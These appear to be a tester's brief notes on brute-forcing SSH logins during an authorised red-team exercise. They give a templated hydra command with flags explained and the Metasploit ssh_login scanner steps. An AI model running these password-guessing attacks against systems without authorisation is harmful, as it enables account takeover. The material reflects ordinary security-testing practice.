We are looking at SSH. Normally its not lower hanging fruit, but we will gonna test it against password strength. We will perform penetration test even though it is hard, because we can try to find out their password policy and test if the blue team actually catches us working and being loud as fuck. The only way to actually exploit ssh is over brute force attacks which are loud

We're going to practice being loud
``hydra -l {user} -P {directory/to/passwords} {port}://{ip} -t 4 -V
-l user
-P passwords
-t threads(?)
-V verbosity


We can also open ssh login scanner for msfconsole.
``>msfconsole 
``>search ssh
``>use auxiliary/scanner/ssh/ssh_login
``>options
``>set {options}
``>exploit
